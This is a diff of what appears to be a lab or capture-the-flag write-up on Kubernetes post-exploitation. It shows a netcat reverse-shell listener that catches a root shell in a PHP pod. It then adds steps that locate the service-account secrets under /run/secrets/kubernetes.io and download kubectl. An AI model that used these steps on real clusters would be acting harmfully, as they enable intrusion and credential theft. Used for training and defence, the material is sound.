@@ -221,15 +221,36 @@ Listening on 0.0.0.0 9001
 
 
 
-root@ip-10-201-39-157:~# nc -nlvp 9001
-Listening on 0.0.0.0 9001
-Connection received on 10.201.49.183 27403
-bash: cannot set terminal process group (1): Inappropriate ioctl for device
-bash: no job control in this shell
+:~# nc -nlvp 9001
+...
 root@php-deploy-6d998f68b9-c2fdc:/var/www/html# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 root@php-deploy-6d998f68b9-c2fdc:/var/www/html# 
+
+
+root@php-deploy-6d998f68b9-c2fdc:/var/www/html# find / type -name *.io 2>/dev/null
+<c:/var/www/html# find / type -name *.io 2>/dev/null
+/run/secrets/kubernetes.io
+root@php-deploy-6d998f68b9-c2fdc:/run/secrets# ls -lah
+ls -lah
+total 12K
+drwxr-xr-x 3 root root 4.0K Oct  5 01:46 .
+drwxr-xr-x 1 root root 4.0K Oct  5 01:46 ..
+drwxr-xr-x 3 root root 4.0K Oct  5 01:46 kubernetes.io
+
+
+
+/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+
+
+/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
+
+:/tmp# echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check
+kubectl: OK
+
+
+
 
 
 
